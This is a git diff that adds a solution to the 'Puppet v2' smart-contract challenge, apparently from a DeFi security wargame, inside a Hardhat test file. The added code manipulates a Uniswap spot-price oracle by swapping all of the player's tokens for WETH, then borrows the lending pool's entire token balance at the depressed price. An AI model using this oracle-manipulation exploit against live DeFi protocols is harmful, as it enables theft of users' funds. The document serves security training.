@@ -6,6 +6,10 @@ const { ethers } = require('hardhat');
 const { expect } = require('chai');
 const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");
 
+function calculateTokenToEthInputPrice(tokensSold, tokensInReserve, etherInReserve) {
+    return (tokensSold * 997n * etherInReserve) / (tokensInReserve * 1000n + tokensSold * 997n);
+}
+
 describe('[Challenge] Puppet v2', function () {
     let deployer, player;
     let token, weth, uniswapFactory, uniswapRouter, uniswapExchange, lendingPool;
@@ -83,6 +87,34 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const outputEth = calculateTokenToEthInputPrice(
+            PLAYER_INITIAL_TOKEN_BALANCE,
+            UNISWAP_INITIAL_TOKEN_RESERVE,
+            UNISWAP_INITIAL_WETH_RESERVE
+        )
+
+        const gasFee = 10n ** 17n // 0.1 ether
+        await weth.connect(player).deposit({value: PLAYER_INITIAL_ETH_BALANCE - gasFee})
+        await token.connect(player).approve(
+            uniswapRouter.address,
+            PLAYER_INITIAL_TOKEN_BALANCE
+        );
+
+        const path = [token.address, weth.address]
+        await uniswapRouter.connect(player).swapExactTokensForTokens(
+            PLAYER_INITIAL_TOKEN_BALANCE, 
+            outputEth,
+            path,
+            player.address,
+            (await ethers.provider.getBlock('latest')).timestamp * 2
+        )
+        const wethBalance = await weth.balanceOf(player.address);
+        await weth.connect(player).approve(
+            lendingPool.address,
+            wethBalance
+        );
+        
+        await lendingPool.connect(player).borrow(POOL_INITIAL_TOKEN_BALANCE)
     });
 
     after(async function () {
